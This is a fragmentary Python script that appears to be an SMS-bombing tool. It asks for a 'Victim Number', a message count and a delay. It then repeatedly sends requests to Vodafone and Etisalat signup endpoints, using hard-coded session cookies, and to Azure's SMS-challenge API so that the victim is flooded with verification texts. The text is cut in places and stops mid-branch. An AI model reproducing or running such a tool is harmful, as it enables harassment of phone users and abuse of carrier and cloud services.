...
def Vodafone():
    ...
    azima = int(input('Enter number of messages: '))
    timeoutt = float(input('Enter delay between every message: '))
    leno = len(number)
...
def Etisalat():
    number = input('Enter Victim Number: ')
    azima = int(input('Enter number of messages: '))
    timeoutt = int(input('Enter delay between every message: '))
    leno = len(number)
    if leno == 11 or leno == 12:
        ...
        cookies = {
            ...
            'DYN_USER_ID': '650271381', 'DYN_USER_CONFIRM': '029cee92122d178787f62bc50bfd5ad2',
            'userPrefLanguage': 'ar_US',
        ...
        data = {'_dyncharset': 'utf-8', '_dynSessConf': '-9126779338117915945', 'password': 'sdfkljsdlfjds@yah4oo.com1',
                ...
                'msisdn': number, '_D:msisdn': '',
                '/atg/store/profile/RegistrationFormHandler.validateAccount': 'Actvate',
        ...
        for i in range(azima):
            r = requests.post(url, verify=True, cookies=cookies,
...
def All():
    ...
    leno = len(number)
    if leno == 11 or leno == 12:
        url = 'https://signup.azure.com/api/risk/BeginSmsChallenge?phoneCountryCode=20&phoneNumber=' + \
              number + '&deliveryType=0&offerId=MS-AZR-0044P'
        header = {
...
def IntlAll():
    countryCode = input('ُEnter country code: ')
    number = input('Enter Victim Number: ')
    azima = int(input('Enter number of messages: '))
    timeoutt = int(input('Enter delay between every message: '))
    url = 'https://signup.azure.com/api/risk/BeginSmsChallenge?phoneCountryCode=' + \
...
if 'ZeyadAzima' not in banner:
    ...
    if choose == 1:
        try:
            Vodafone()
            print('By: ZeyadAzima, qarqoush and ahmedmgh')
        except:
            Vodafone()
    elif choose == 2:
        try:
